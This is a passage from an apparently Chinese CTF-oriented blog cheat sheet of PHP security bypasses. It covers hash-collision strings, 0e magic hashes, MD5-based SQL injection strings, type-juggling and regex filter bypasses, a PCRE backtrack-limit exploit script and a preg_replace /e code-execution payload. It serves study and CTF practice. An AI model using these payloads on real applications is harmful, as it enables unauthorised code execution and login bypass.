class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1</span><br><span class="line">和</span><br><span class="line">%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure>

<h3 id="4-双重md5下的0e绕过"><a href="#4-双重md5下的0e绕过" class="headerlink" title="4.双重md5下的0e绕过"></a>4.双重md5下的0e绕过</h3><p>爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000000000000</span>):</span><br><span class="line">    data = <span class="string">&quot;0e&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    md5 = hashlib.md5(data.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    md52 = hashlib.md5(<span class="built_in">str</span>(md5).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md52[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> md52[<span class="number">2</span>:].isnumeric():</span><br><span class="line">        <span class="built_in">print</span>(data+<span class="string">&quot;: &quot;</span>+md52)</span><br></pre></td></tr></table></figure>

<p>以下字符串进行两次md5后以0e开头</p>
<ul>
<li><code>0e1138100474</code></li>
</ul>
<h3 id="5-md5绕过SQL"><a href="#5-md5绕过SQL" class="headerlink" title="5.md5绕过SQL"></a>5.md5绕过SQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop，经过md5函数后结果为 &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c；</span><br><span class="line"></span><br><span class="line">129581926211651571912466741651878684928，经过md5函数后结果为 \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8；</span><br></pre></td></tr></table></figure>

<p>这两个加密后都是万能密码</p>
<h3 id="6-md5-sha1-加密后弱等于初始值"><a href="#6-md5-sha1-加密后弱等于初始值" class="headerlink" title="6.md5(sha1)加密后弱等于初始值"></a>6.md5(sha1)加密后弱等于初始值</h3><p><code>$a==md5($a)</code></p>
<p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p>
<p><strong>$a&#x3D;&#x3D;sha1($a)</strong></p>
<p>0e1290633704的sha1值也是由0e开头的，在弱比较中相等</p>
<h3 id="7-图片文本强碰撞绕过"><a href="#7-图片文本强碰撞绕过" class="headerlink" title="7.图片文本强碰撞绕过"></a>7.图片文本强碰撞绕过</h3><p>可以用工具fastcoll（md5强碰撞生成工具）</p>
<p>例如我们需要生成两个md5值相同的图片&#x2F;文本，可以利用工具去生成</p>
<p><img src="/../image/achieve/202411/XYCTF2024/9ed27e530d8b8e2ec0c225fe8a85d8ec.png" alt="9ed27e530d8b8e2ec0c225fe8a85d8ec"></p>
<h2 id="is-numeric-函数绕过"><a href="#is-numeric-函数绕过" class="headerlink" title="is_numeric()函数绕过"></a>is_numeric()函数绕过</h2><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250611170208447.png" alt="image-20250611170208447"></p>
<p>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE。</p>
<p>绕过!is_numeric($num)的判断：</p>
<ul>
<li>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</li>
<li>构造浮点数可以绕过判断</li>
</ul>
<h2 id="strcmp-函数绕过"><a href="#strcmp-函数绕过" class="headerlink" title="strcmp()函数绕过"></a>strcmp()函数绕过</h2><p><code>strcmp()</code> 是一个 PHP 函数，用于比较两个字符串。它的用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure>

<ul>
<li>如果 <code>str1</code> 小于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个小于 0 的整数。</li>
<li>如果 <code>str1</code> 大于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个大于 0 的整数。</li>
<li>如果 <code>str1</code> 等于 <code>str2</code>，那么 <code>strcmp()</code> 返回 0。</li>
</ul>
<p>strcmp函数无法比较数组对象，会返回0</p>
<h2 id="intval-函数漏洞绕过"><a href="#intval-函数漏洞绕过" class="headerlink" title="intval()函数漏洞绕过"></a>intval()函数漏洞绕过</h2><h3 id="什么是intval-？"><a href="#什么是intval-？" class="headerlink" title="什么是intval()？"></a>什么是intval()？</h3><p><code>intval()</code> 函数是 PHP 中的一个内置函数，用于获取变量的整数值。常用于强制类型转换。</p>
<p>基础语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(mixed $value, int $base = 10): int</span><br></pre></td></tr></table></figure>

<p>参数：</p>
<ul>
<li>$var：需要转换成 integer 的「变量」</li>
<li>$base：转换所使用的「进制」</li>
</ul>
<p><strong>注意</strong>:</p>
<p>如果 <code>base</code> 是 0，通过检测 <code>value</code> 的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
<li>如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，</li>
<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
<li>将使用 10 进制 (decimal)。</li>
</ul>
<p>返回值</p>
<p>成功时返回 <code>value</code> 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);          <span class="comment">//42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42.2</span>);        <span class="comment">//42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);         <span class="comment">//34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x42</span>);        <span class="comment">//66</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>));     <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());           <span class="comment">//0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><ul>
<li>当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。</li>
<li>对于弱比较（a&#x3D;&#x3D;b），可以给a、b两个参数传入空数组，使弱比较为true。</li>
<li>当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。</li>
<li>当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。</li>
<li>当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。</li>
<li>当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。</li>
</ul>
<h2 id="stripos-函数绕过"><a href="#stripos-函数绕过" class="headerlink" title="stripos()函数绕过"></a>stripos()函数绕过</h2><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251013144517827.png" alt="image-20251013144517827"></p>
<p>可以看到stripos函数是一种不区分大小写的检测，而通常我们在遇到waf的时候很多都是用stripos函数去进行检测的，例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$waf</span> = <span class="keyword">array</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;rar&#x27;</span>,<span class="string">&#x27;filter&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$waf</span> <span class="keyword">as</span> <span class="variable">$waf_word</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="variable">$waf_word</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;waf:&quot;</span>.<span class="variable">$waf_word</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="关于preg-match-绕过"><a href="#关于preg-match-绕过" class="headerlink" title="关于preg_match()绕过"></a>关于preg_match()绕过</h2><h3 id="什么是preg-match？"><a href="#什么是preg-match？" class="headerlink" title="什么是preg_match？"></a>什么是preg_match？</h3><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403142430100.png" alt="image-20250403142430100"></p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul>
<li>数组绕过</li>
</ul>
<p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
<ul>
<li>换行符绕过</li>
</ul>
<p>特殊字符<code>.</code>在正则表达式中可以匹配任何字符串，换行符除外</p>
<p>例如我们这里有代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*(flag).*$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配成功&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们传入a&#x3D;flag，就满足了正则匹配，返回匹配成功</p>
<p>如果我们传入a&#x3D;%0aflag,就能绕过正则匹配，返回匹配失败，这是为什么呢？</p>
<p>当传入 <code>a=\nflag</code> 时：</p>
<ol>
<li><p><strong><code>^</code></strong> - 匹配字符串开头</p>
</li>
<li><p><code>.*</code>- 尝试贪婪匹配：</p>
<ul>
<li>默认情况下 <code>.</code> 不匹配换行符 <code>\n</code></li>
<li>所以 <code>.*</code> 在这里匹配空字符串</li>
</ul>
</li>
<li><p>剩余字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\nflag</span><br></pre></td></tr></table></figure>

<ul>
<li>需要匹配 <code>(flag)</code>，但开头是 <code>\n</code></li>
<li>无法匹配 <code>f</code>，所以整体匹配失败</li>
</ul>
</li>
<li><p><strong>返回0</strong>（不匹配）</p>
</li>
</ol>
<p><code>*</code> 是贪婪量词，会尽可能多地匹配字符。当后续匹配失败时，会逐步”吐出”已匹配的字符（回溯）。</p>
<h3 id="PHP利用PCRE回溯次数限制绕过"><a href="#PHP利用PCRE回溯次数限制绕过" class="headerlink" title="PHP利用PCRE回溯次数限制绕过"></a>PHP利用PCRE回溯次数限制绕过</h3><p>参考P牛的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<p>实例代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_php</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下就是判断用户输入的内容有没有php代码，如果没有就写入文件，显而易见我们需要绕过这个正则匹配去写入我们期望的代码，这时候该怎么做呢？</p>
<h3 id="正则引擎"><a href="#正则引擎" class="headerlink" title="正则引擎"></a>正则引擎</h3><p>常见的正则引擎，往往被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机），他们匹配的过程是这样的</p>
<ul>
<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入(线性匹配)</li>
<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态(回溯机制)</li>
</ul>
<p>大多数编程语言都采用的NFA作为正则引擎，其中也包括PHP使用的PCRE库</p>
<h3 id="回溯的过程"><a href="#回溯的过程" class="headerlink" title="回溯的过程"></a>回溯的过程</h3><p>例如p牛这里测试了一个案例</p>
<p>假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>，实际执行流程是这样的：</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png" alt="image.png"></p>
<p>可以看见在第四步的时候，由于<code>.*</code>贪婪匹配机制，第一个<code>.*</code>最终匹配到我们输入的字符串的结尾(<code>&lt;?php phpinfo();//aaaaa</code>)，但这样的话后面的匹配就匹配不上，因为在<code>.*</code>后还应该匹配**[(`;?&gt;]*<em>，所以NFA开始回溯匹配，从末尾开始，先吐出一个a，此时&#96;.</em><code>匹配的是</code><?php phpinfo();//aaaa`，尝试用**[(\`;?>]**去匹配a，但仍然匹配不上，继续回溯，再吐出一个a，尝试匹配aa，但仍然不行……</p>
<p>一直回溯直到第12步，此时<code>.*</code>匹配的是<code>&lt;?php phpinfo()</code>后面的<code>;</code>则匹配上**[(`;?&gt;]*<em>，此时这个结果才能满足正则表达式的结果，于是就不再回溯，继续向后匹配表达式，第二个&#96;.</em>&#96;匹配到了字符串末尾，最后结束匹配。</p>
<p>以上就是NFA的回溯机制。</p>
<h3 id="关于PHP的pcre-backtrack-limit限制利用"><a href="#关于PHP的pcre-backtrack-limit限制利用" class="headerlink" title="关于PHP的pcre.backtrack_limit限制利用"></a>关于PHP的pcre.backtrack_limit限制利用</h3><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403150831133.png" alt="image-20250403150831133"></p>
<p>在官方文档中也有写到</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403150958553.png" alt="image-20250403150958553"></p>
<p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会造成什么结果呢？我们尝试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(preg_match(&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;,&#x27;&lt;?php phpinfo();//&#x27; . str_repeat(&#x27;c&#x27;,1000000)));</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403151342526.png" alt="image-20250403151342526"></p>
<p>结果返回了false，而并非1和0，<code>preg_match</code>函数返回false表示此次执行失败了</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403151628711.png" alt="image-20250403151628711"></p>
<p>我们可以用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR</span><br></pre></td></tr></table></figure>

<p>这行代码用于<strong>检测最后一次PCRE正则操作是否因回溯限制而失败</strong>。</p>
<table>
<thead>
<tr>
<th>组成部分</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>preg_last_error()</code></td>
<td>PHP函数，返回最后一次PCRE正则操作的错误代码</td>
</tr>
<tr>
<td><code>PREG_BACKTRACK_LIMIT_ERROR</code></td>
<td>PHP常量，值为2，表示正则匹配超出最大回溯限制</td>
</tr>
<tr>
<td><code>===</code></td>
<td>比较运算符，检查值和类型是否完全一致</td>
</tr>
</tbody></table>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403151741726.png" alt="image-20250403151741726"></p>
<p>这里返回true，说明确实是因为超出了最大回溯限制而执行失败</p>
<p>所以上面那道例题的答案就很明显了，可以通过发送超长字符串使正则执行失败，让我们的php代码成功写入</p>
<p>最终的exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line">    </span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: <span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;aaa&lt;?php phpinfo();//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.<span class="title function_ invoke__">post</span>(url=url, files=files, allow_redirects=False)</span><br><span class="line"><span class="keyword">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<h2 id="preg-replace-e-模式下的RCE"><a href="#preg-replace-e-模式下的RCE" class="headerlink" title="preg_replace &#x2F;e 模式下的RCE"></a>preg_replace &#x2F;e 模式下的RCE</h2><p>限制版本：PHP &lt;&#x3D;5.5</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E5%89%8D%E8%A8%80">深入研究preg_replace与代码执行</a></p>
<h3 id="什么是preg-replace-函数？"><a href="#什么是preg-replace-函数？" class="headerlink" title="什么是preg_replace()函数？"></a>什么是<strong>preg_replace</strong>()函数？</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(</span><br><span class="line">    string|array $pattern,</span><br><span class="line">    string|array $replacement,</span><br><span class="line">    string|array $subject,</span><br><span class="line">    int $limit = -1,</span><br><span class="line">    int &amp;$count = null</span><br><span class="line">): string|array|null</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403154616821.png" alt="image-20250403154616821"></p>
<p>其实这里的漏洞很简单，如果<strong>preg_replace</strong> 使用了 <strong>&#x2F;e</strong> 模式，就可以导致代码执行，当使用了&#x2F;e模式的时候，<strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串当成代码去执行，</p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$regex</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这里第一个和第三个参数都是我们可控的，我们也知道了preg_replace匹配到符号正则的字符串时，会将替换字符串当成代码去执行，但是因为这里第二个参数是固定的，此时我们应该怎么执行代码呢？</p>
<p>在参数2中，我们可以看到有<code>\1</code>，其实<code>\1</code>在这个函数中是有含义的，<code>\1</code> 是 <strong>反向引用</strong>，指代正则中的第1个捕获组。</p>
<h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><p>如果在正则表达式两边添加括号，那么就会导致相关的<strong>匹配存储到一个临时的缓冲区</strong>，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403161315817.png" alt="image-20250403161315817"></p>
<p>所以实际上这里就是匹配第一个子匹配项，可能现在还不能理解，先拿payload去讲解吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：/?.*=&#123;$&#123;phpinfo()&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>那么结果就是</p>
